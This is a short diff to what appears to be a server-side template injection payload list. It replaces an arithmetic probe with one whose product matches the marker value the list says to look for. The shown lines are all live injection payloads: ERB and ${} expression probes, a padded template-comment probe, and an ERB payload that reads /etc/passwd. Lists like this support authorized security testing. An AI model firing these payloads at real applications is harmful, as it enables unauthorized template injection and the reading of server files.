@@ -1,5 +1,5 @@
 ##### LOOK FOR 1868686868
-<%= 666 * 666 %>
+<%= 36692 * 50929 %>
 <%= File.open('/etc/passwd').read %>
 ${36692*50929}
 aaaaaaaaaaaaaaaaaaaaaa{*cccccccccccccccccccccccccccccccc*}bbbbbbbbbbbbbbbbbbbbbbbbb
